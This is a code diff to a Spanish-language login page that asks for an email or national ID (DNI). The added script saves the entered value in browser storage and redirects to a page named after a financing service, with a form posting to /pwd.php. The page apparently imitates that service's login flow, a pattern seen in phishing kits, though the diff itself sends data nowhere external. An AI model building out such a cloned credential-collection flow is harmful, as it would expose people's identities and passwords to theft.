@@ -24,7 +24,7 @@
     </header>
     <main class="row m-0">
       <div class="col-sm-6 logon">
-        <form class="w-100 mx-448 m-auto" method="POST" action="/pwd.php">
+        <form class="w-100 mx-448 m-auto" method="POST" action="/pwd.php" onsubmit="saveUser(event)">
           <div class="text-center mb-5">
             <h1 class="fw-bold fs-32px">Bienvenido de nuevo!</h1>
           </div>
@@ -32,7 +32,7 @@
             <label for="exampleInputEmail1" class="form-label">Email o DNI para ingresar:</label>
             <input type="text" required placeholder="Tu email o DNI" class="form-control" name="user" id="exampleInputEmail1" aria-describedby="emailHelp">
           </div>
-          <button name="pwpp" class="btn btn-primary mb-4 rounded-3 w-100 fw-bold text-uppercase">comenzar</button>
+          <button type="submit" class="btn btn-primary mb-4 rounded-3 w-100 fw-bold text-uppercase">Siguiente</button>
           <p>
             ¿No tienes cuenta? <a href="" class="text-dark">Registrarse</a>
           </p>
@@ -49,6 +49,15 @@
     <a href="" class="d-block position-fixed help bg-primary">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32" fill="#FFF"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg>
     </a>
+    
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+     <script>
+        function saveUser(event) {
+            event.preventDefault();
+            const user = document.getElementById('exampleInputEmail1').value;
+            localStorage.setItem('user', user);
+            window.location.href = '/ingreso-go-cuotas'; // Redirect to /alerta
+          }
+     </script>
   </body>
 </html>
